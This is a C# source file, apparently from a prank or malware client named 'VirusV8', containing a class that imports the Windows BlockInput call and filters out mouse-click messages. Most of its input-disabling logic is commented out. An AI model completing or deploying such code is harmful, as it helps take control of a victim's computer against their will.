using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace VirusV8_Client 
{
    class mousedisable_event : IMessageFilter
    {
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        public static void Disable()
        {
            //OldRect = Cursor.Clip;
            //// Arbitrary location.
            //BoundRect = new Rectangle(50, 50, 1, 1);
            //Cursor.Clip = BoundRect;
            //Cursor.Hide();
            //Application.AddMessageFilter(this);
            //Timer t = new Timer();
            //t.Interval = 5000;
            //t.Tick += T_Tick;
            //t.Enabled = true;
        }

        private static void T_Tick(object sender, EventArgs e)
        {
            Enable();
        }

        public static void Enable()
        {
            //Cursor.Clip = OldRect;
            //Cursor.Show();
            //Application.RemoveMessageFilter(this);
        }

        public bool PreFilterMessage(ref Message m)
        {
            if (m.Msg == 0x201 || m.Msg == 0x202 || m.Msg == 0x203) return true;
            if (m.Msg == 0x204 || m.Msg == 0x205 || m.Msg == 0x206) return true;
            return false;
        }
    }
}
